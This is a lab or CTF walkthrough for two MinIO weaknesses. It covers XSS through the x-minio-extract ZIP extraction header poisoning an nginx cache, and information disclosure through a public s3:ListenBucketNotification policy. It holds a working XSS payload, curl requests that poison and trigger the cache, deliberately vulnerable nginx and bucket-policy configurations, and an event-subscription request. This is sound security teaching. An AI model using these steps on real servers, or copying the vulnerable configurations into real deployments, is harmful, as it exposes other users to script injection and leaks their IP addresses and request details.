# MinIO Security Vulnerabilities Lab

## Lab Overview
This lab demonstrates two critical MinIO security vulnerabilities:
1. **ZIP Extraction XSS via Cache Poisoning**
2. **Bucket Event Subscription Information Disclosure**

## Lab Setup

### 1. Docker Compose Configuration

Create `docker-compose.yml`:

```yaml
version: '3.8'
services:
  minio:
    image: minio/minio:latest
    container_name: minio-ctf
    ports:
      - "9000:9000"
      - "9001:9001"
    environment:
      MINIO_ROOT_USER: minioadmin
      MINIO_ROOT_PASSWORD: minioadmin123
    command: server /data --console-address ":9001"
    volumes:
      - minio_data:/data
    networks:
      - minio-network

  nginx:
    image: nginx:alpine
    container_name: nginx-cache
    ports:
      - "8080:80"
    volumes:
      - ./nginx.conf:/etc/nginx/nginx.conf:ro
      - ./cache:/var/cache/nginx
    depends_on:
      - minio
    networks:
      - minio-network

volumes:
  minio_data:

networks:
  minio-network:
    driver: bridge
```

### 2. Nginx Caching Configuration

Create `nginx.conf`:

```nginx
events {
    worker_connections 1024;
}

http {
    proxy_cache_path /var/cache/nginx levels=1:2 keys_zone=minio_cache:10m max_size=10g 
                     inactive=60m use_temp_path=off;

    upstream minio {
        server minio:9000;
    }

    server {
        listen 80;
        server_name localhost;

        location / {
            proxy_pass http://minio;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;
            
            # Cache configuration - VULNERABLE by design
            proxy_cache minio_cache;
            proxy_cache_valid 200 304 60m;
            proxy_cache_key "$scheme$request_method$host$request_uri";
            # Notice: x-minio-extract header is NOT included in cache key
            
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}
```

### 3. Start the Lab

```bash
# Create necessary directories
mkdir -p cache

# Start the services
docker-compose up -d

# Wait for services to be ready
sleep 10
```

## Challenge 1: ZIP Extraction XSS Cache Poisoning

### Objective
Exploit MinIO's ZIP extraction feature to perform XSS via cache poisoning.

### Setup Steps

1. **Access MinIO Console**
   - Navigate to http://localhost:9001
   - Login with `minioadmin` / `minioadmin123`
   - Create a bucket called `ctf-bucket`

2. **Create Malicious ZIP File**

Create the following files and zip them:

**innocent.txt:**
```
This is just an innocent text file.
Nothing to see here!
```

**payload.html:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>CTF Challenge</title>
</head>
<body>
    <h1>XSS SUCCESS!</h1>
    <script>
        alert('XSS via MinIO ZIP Extraction Cache Poisoning!');
        // For CTF scoring, you could make this send data to a webhook
        fetch('http://localhost:8080/ctf-bucket/flag.txt?solved=zip-xss', {
            method: 'POST',
            body: 'ZIP XSS Challenge Completed by: ' + navigator.userAgent
        }).catch(e => console.log('Flag endpoint not available'));
    </script>
</body>
</html>
```

**Create malicious.zip:**
```bash
# Create the files
echo "This is just an innocent text file.\nNothing to see here!" > innocent.txt

cat > payload.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>CTF Challenge</title>
</head>
<body>
    <h1>XSS SUCCESS!</h1>
    <script>
        alert('XSS via MinIO ZIP Extraction Cache Poisoning!');
        console.log('ZIP XSS Challenge Completed!');
    </script>
</body>
</html>
EOF

# Create the ZIP file
zip malicious.zip innocent.txt payload.html
```

3. **Upload the ZIP file to the bucket**

### Challenge Tasks

**Task 1: Poison the Cache**
```bash
# Make a request with the extraction header to poison the cache
curl -v "http://localhost:8080/ctf-bucket/malicious.zip/payload.html" \
  -H "x-minio-extract: true" \
  -H "User-Agent: Attacker-Bot/1.0"
```

**Task 2: Trigger the XSS**
```bash
# Make a normal request without the header - should get cached malicious content
curl -v "http://localhost:8080/ctf-bucket/malicious.zip/payload.html"
```

**Task 3: Verify Cache Behavior**
- Check the `X-Cache-Status` header in responses
- First request should show `MISS` or `UPDATING`
- Second request should show `HIT`
- Both should return HTML content, not ZIP binary data

## Challenge 2: Bucket Event Subscription Information Disclosure

### Objective
Exploit misconfigured bucket permissions to gain real-time access to bucket events and internal information.

### Setup Steps

1. **Configure Bucket Policy (Vulnerable)**

Create `vulnerable-policy.json`:
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "PublicReadGetObject",
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "s3:GetObject",
                "s3:ListenBucketNotification"
            ],
            "Resource": [
                "arn:aws:s3:::ctf-bucket/*",
                "arn:aws:s3:::ctf-bucket"
            ]
        }
    ]
}
```

2. **Apply the Policy**
```bash
# Using MinIO client (mc)
docker run --rm -it --network minio-ctf_minio-network \
  minio/mc:latest sh -c "
  mc alias set minio http://minio:9000 minioadmin minioadmin123
  mc anonymous set-json /tmp/policy.json minio/ctf-bucket
" -v $(pwd)/vulnerable-policy.json:/tmp/policy.json
```

### Challenge Tasks

**Task 1: Subscribe to Bucket Events**
```bash
# Subscribe to all object access events
curl -N "http://localhost:8080/ctf-bucket/?events=s3:ObjectAccessed:*&ping=1" \
  -H "User-Agent: CTF-Participant" &

# Keep this running in background to monitor events
```

**Task 2: Generate Events and Observe**
```bash
# In another terminal, generate some activity
curl "http://localhost:8080/ctf-bucket/malicious.zip"
curl "http://localhost:8080/ctf-bucket/innocent.txt"
curl "http://localhost:8080/ctf-bucket/nonexistent.txt"
```

### explanition

MinIO supports listing the contents of ZIP archives and extracting files from them.

To use this functionality, the object in the bucket must have a zip extension (checked for the ".zip/" substring) and the HTTP request must contain the additional x-minio-extract header.

Listing archive contents:
GET /bucket/?prefix=archive.zip/&list-type=2 HTTP/1.1
Host: 127.0.0.1:9000
x-minio-extract: true

Getting a file from an archive:
GET /bucket/archive.zip/test.html HTTP/1.1
Host: 127.0.0.1:9000
x-minio-extract: true

Under specific conditions, this behavior can be used for XSS if:
• The attacker controls the contents and name of the object, but not the Content-Type (in such cases, the response-content-type parameter should also be checked)
• Requests to objects are cached

By caching the XSS in the response using x-minio-extract, it can be used against other clients, since this header will not be used in the cache key.

Another interesting feature in MinIO is subscribing to bucket events. If a bucket is configured insecurely and the s3:ListenBucketNotification action is enabled, this allows real-time access to information about the internal MinIO address, object changes, or user requests to objects, including the IP address and User-Agent.

Example request (Full list of events):
curl "http://127.0.0.1:9000/bucket/?events=s3:ObjectAccessed:*&ping=1"